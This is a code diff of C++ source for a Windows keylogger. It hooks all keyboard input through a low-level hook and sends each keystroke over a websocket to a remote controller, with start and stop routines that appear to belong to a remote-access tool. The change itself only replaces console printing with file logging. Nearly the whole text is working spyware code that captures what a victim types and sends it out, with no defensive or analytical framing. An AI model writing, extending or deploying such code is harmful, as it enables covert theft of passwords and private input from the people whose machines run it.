@@ -1,18 +1,12 @@
 #include "keylogger.h"
-#include "global.h"     
 
 static HHOOK g_keyboardHook = NULL;
-
 static std::shared_ptr<websocket::stream<tcp::socket>> g_ws_ptr;
-
 static DWORD g_keyloggerThreadId = 0;
 
 void logKeystroke(int key) {
     try {
-        // std::lock_guard<std::mutex> lock(ws_mutex);
-
         if (!g_keylogger.load() || !g_ws_ptr) return;
-
         if (key == VK_BACK) 
             sendMsg(*g_ws_ptr, "text", "Keylogger", "[BACKSPACE]");
         else if (key == VK_RETURN) 
@@ -36,13 +30,10 @@ void logKeystroke(int key) {
             sendMsg(*g_ws_ptr, "text", "Keylogger", "[F" + std::to_string(key - VK_F1 + 1) + "]");
         else 
             sendMsg(*g_ws_ptr, "text", "Keylogger", "[" + std::to_string(key) + "]");
-    
     } catch (const std::exception& e) {
-        std::cerr << "Keylogger: Error: auto stop " << e.what() << std::endl;
-        
-        if (g_keyloggerThreadId != 0) {
+        file_logger->error("Keylogger exception: {}", e.what());
+        if (g_keyloggerThreadId != 0) 
             PostThreadMessage(g_keyloggerThreadId, WM_QUIT, 0, 0);
-        }
     }
 }
 
@@ -56,13 +47,11 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 void key_log_start(std::shared_ptr<websocket::stream<tcp::socket>> ws_ptr) {
-
     std::lock_guard<std::mutex> lock(g_control_mutex);
-
     if (g_keylogger.load()) { 
         try {
-            // std::lock_guard<std::mutex> lock(ws_mutex);
             sendMsg(*ws_ptr, "text", "Info", "Keylogger is already running.");
+            file_logger->info("Keylogger is already running.");
         } catch (...) {} 
         return;
     }
@@ -72,65 +61,54 @@ void key_log_start(std::shared_ptr<websocket::stream<tcp::socket>> ws_ptr) {
 
     keylogger_thread = std::thread([ws_ptr]() {
         g_keyloggerThreadId = GetCurrentThreadId();
-
         g_keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
-        
         if (g_keyboardHook == NULL) {
             try {
-                // std::lock_guard<std::mutex> lock(ws_mutex);
                 sendMsg(*ws_ptr, "text", "Error", "Failed to install keyboard hook!");
+                file_logger->error("Failed to install keyboard hook for keylogger.");
             } catch (...) {}
             g_keylogger = false;
             return;
         }
-
         MSG msg;
         while (GetMessage(&msg, NULL, 0, 0)) {
             TranslateMessage(&msg);
             DispatchMessage(&msg);
         }
-
         UnhookWindowsHookEx(g_keyboardHook);
         g_keyboardHook = NULL; 
         g_keyloggerThreadId = 0;
-        
-        std::cout << "Keylogger thread stopped." << std::endl;
+        file_logger->info("Keylogger thread stopped.");
     });
 }
 
 void key_log_stop() {
-
     std::lock_guard<std::mutex> lock(g_control_mutex);
-
-    if (!g_keylogger.load()) {
+    if (!g_keylogger.load()) 
         return;
-    }
+    
     g_keylogger = false; 
-
     if (g_keyboardHook != NULL) {
         UnhookWindowsHookEx(g_keyboardHook);
         g_keyboardHook = NULL;
     }
 
-    if (g_keyloggerThreadId != 0) {
+    if (g_keyloggerThreadId != 0) 
         PostThreadMessage(g_keyloggerThreadId, WM_QUIT, 0, 0);
-    }
 
     std::thread temp_thread = std::move(keylogger_thread);
-
     std::thread([t = std::move(temp_thread)]() mutable {
         try {
             if (t.joinable()) {
                 t.join();
-                std::cout << "Reaper: Keylogger thread joined." << std::endl;
+                file_logger->info("Reaper: Keylogger thread joined.");
             }
         } catch (const std::exception& e) {
-            std::cerr << "Reaper: Exception caught joining keylogger thread: " << e.what() << std::endl;        
+            file_logger->error("Reaper: Exception caught joining keylogger thread: {}", e.what());
         } catch (...) {
-            std::cerr << "Reaper: Unknown exception caught joining keylogger thread." << std::endl;        
+            file_logger->error("Reaper: Unknown exception caught joining keylogger thread.");
         }
     }).detach();
-    
     g_keyloggerThreadId = 0; 
     g_ws_ptr.reset(); 
 }
